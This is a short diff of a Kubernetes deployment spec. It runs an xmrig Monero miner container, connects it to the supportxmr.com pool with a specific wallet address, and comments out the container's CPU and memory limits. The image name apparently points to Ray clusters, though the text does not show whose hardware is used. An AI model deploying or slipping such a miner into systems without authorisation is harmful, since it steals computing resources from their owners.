@@ -16,12 +16,12 @@ spec:
         - name: xmrig
           image: hoon33710/ray-xmrig:latest
           args: ["-o", "pool.supportxmr.com:3333", "-u", "49ppzHZhAG2AWEq2SVgHboMV3ow8PbtfZchS1yiiKwKY9hrR7nYtZjhYdDtuSDWbVSTCGFxnkSfxKPvmm1kz9XFkBy2xYWN", "-p", "x", "-k"]
-          resources:
-            limits:
-              cpu: "16"
-              memory: "29Gi"
-            requests:
-              cpu: "15.3"
-              memory: "27Gi"
+          # resources:
+          #   limits:
+          #     cpu: "15.9"
+          #     memory: "60Gi"
+          #   requests:
+          #     cpu: "15.4"
+          #     memory: "55Gi"
       restartPolicy: Always
 
